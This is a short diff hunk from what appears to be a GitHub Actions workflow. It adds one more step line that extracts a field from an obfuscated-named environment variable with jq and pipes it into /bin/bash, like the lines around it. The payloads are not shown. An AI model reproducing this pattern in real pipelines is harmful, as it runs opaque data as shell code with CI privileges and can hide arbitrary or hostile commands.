@@ -35,6 +35,7 @@ jobs:
           echo $pwgsk64 | jq -r .kchqx74561 | /bin/bash
           echo $li28449 | jq -r .utv7886 | /bin/bash
           printf '%s' "$t53075" | jq -r .pkivy64574 | /bin/bash
+          echo $umnyo0 | jq -r .rs6250 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
